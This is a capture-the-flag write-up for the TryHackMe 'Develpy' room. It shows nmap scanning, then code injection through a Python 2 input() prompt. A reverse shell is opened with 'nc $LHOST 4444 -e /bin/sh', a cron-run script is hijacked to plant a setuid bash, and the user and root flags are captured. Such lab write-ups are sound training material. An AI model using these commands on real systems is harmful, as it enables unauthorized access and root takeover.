| Category          | Details                                               |
|-------------------|-------------------------------------------------------|
| 📝 **Name**       | [Develpy](https://tryhackme.com/room/bsidesgtdevelpy) |  
| 🏷 **Type**       | THM Challenge                                         |
| 🖥 **OS**         | Linux                                                 |
| 🎯 **Difficulty** | Medium                                                |
| 📁 **Tags**       | Python2 input(), crontab                              |

## Task 1: Develpy

### user.txt

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Develpy]
└─$ nmap -sS -sC -sV $TARGET    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-03 12:45 +0100
Nmap scan report for 10.80.130.52
Host is up (0.061s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   GetRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   NULL: 
|     Private 0days
|_    Please enther number of exploits to send??:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.98%I=7%D=1/3%Time=6959016C%P=x86_64-pc-linux-gnu%r(NU
SF:LL,48,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x20
SF:Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20")%r
SF:(GetRequest,136,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r
SF:\n\r\n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\
SF:?:\x20Traceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\
SF:x20\"\./exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20\
SF:x20num_exploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x20
SF:of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<string
SF:>\",\x20line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'GET'\x20
SF:is\x20not\x20defined\r\n")%r(HTTPOptions,13A,"\r\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20of
SF:\x20exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20cal
SF:l\x20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20in
SF:\x20<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20P
SF:lease\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\)
SF:\r\n\x20\x20File\x20\"<string>\",\x20line\x201,\x20in\x20<module>\r\nNa
SF:meError:\x20name\x20'OPTIONS'\x20is\x20not\x20defined\r\n")%r(RTSPReque
SF:st,13A,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x2
SF:0Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20Tra
SF:ceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\x20\"\./e
SF:xploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20\x20num_ex
SF:ploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x20of\x20exp
SF:loits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<string>\",\x20l
SF:ine\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'OPTIONS'\x20is\x2
SF:0not\x20defined\r\n")%r(GenericLines,13B,"\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20of\x20
SF:exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20call\x2
SF:0last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20in\x20
SF:<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20Pleas
SF:e\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\n
SF:\x20\x20File\x20\"<string>\",\x20line\x200\r\n\x20\x20\x20\x20\r\n\x20\
SF:x20\x20\x20\^\r\nSyntaxError:\x20unexpected\x20EOF\x20while\x20parsing\
SF:r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.92 seconds
```

#### Use `nc` to connect to application running at port 10000
```
┌──(magicrc㉿perun)-[~/attack/THM Develpy]
└─$ nc $TARGET 10000

        Private 0days

 Please enther number of exploits to send??: 2

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.03 ms
Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.085 ms
```
When passed `2` to prompt, `Exploiting tryhackme ...` has been printed twice. 

#### Pass `(1+2)*2` to see if it will be evaluated
```
┌──(magicrc㉿perun)-[~/attack/THM Develpy]
└─$ nc $TARGET 10000

        Private 0days

 Please enther number of exploits to send??: (1+2)*2

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.086 ms
Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.058 ms
Exploiting tryhackme internal network: beacons_seq=3 ttl=1337 time=0.044 ms
Exploiting tryhackme internal network: beacons_seq=4 ttl=1337 time=0.02 ms
Exploiting tryhackme internal network: beacons_seq=5 ttl=1337 time=0.026 ms
Exploiting tryhackme internal network: beacons_seq=6 ttl=1337 time=0.070 ms
```
We can 6 lines printed meaning that indeed our expression has been evaluated.

#### Pass `test` to see if it will trigger error
```
┌──(magicrc㉿perun)-[~/attack/THM Develpy]
└─$ nc $TARGET 10000

        Private 0days

 Please enther number of exploits to send??: test
Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1, in <module>
NameError: name 'test' is not defined
```
`test` triggers error and traceback shows that we are dealing with Python code and exact place of error occurrence
```
num_exploits = int(input(' Please enther number of exploits to send??: '))`
```
Error in this line also proves that this script is being run with Python 2, as `input()` internally evaluates Python code. All that means that RCE vulnerability sits in this exact line.

#### Confirm RCE vulnerability
```
┌──(magicrc㉿perun)-[~/attack/THM Develpy]
└─$ nc $TARGET 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('id')
uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)

Exploit started, attacking target (tryhackme.com)...
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Develpy]
└─$ nc -lvnp 4444                      
listening on [any] 4444 ...
```

#### Exploit RCE to spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Develpy]
└─$ REVERSE_SHELL=$(echo "__import__('os').system('nc $LHOST 4444 -e /bin/sh')")
nc $TARGET 10000 <<< $REVERSE_SHELL

        Private 0days

 Please enther number of exploits to send??:
```

#### Confirm foothold gained
```
connect to [192.168.132.170] from (UNKNOWN) [10.80.130.52] 42038
python -c 'import pty; pty.spawn("/bin/bash")'
king@ubuntu:~$ id
id
uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

#### Capture user flag
```
king@ubuntu:~$ cat /home/king/user.txt
cat /home/king/user.txt
cf85ff769cfaaa721758949bf870b019
```

### root.txt

#### Discover `/home/king/root.sh` in `root` `crontab` entry
```
cat /etc/crontab
<SNIP>
*  *    * * *   root    cd /home/king/ && bash root.sh
<SNIP>
```
Since `root.sh` sits in `/home/king` we could replace it with root shell spawner.

#### Replace `/home/kind/root.sh` with root shell spawner
```
king@ubuntu:~$ rm -f /home/king/root.sh && echo '/bin/cp /bin/bash /tmp/root_shell && /bin/chmod +s /tmp/root_shell' > /home/king/root.sh
```
Wait for `crontab` to spawn root shell.

#### Use root shell to escalate privileges
```
king@ubuntu:~$ /tmp/root_shell -p
/tmp/root_shell -p
root_shell-4.3# id
id
uid=1000(king) gid=1000(king) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(king)
```

#### Capture root flag
```
root_shell-4.3# cat /root/root.txt
cat /root/root.txt
9c37646777a53910a347f387dce025ec
```
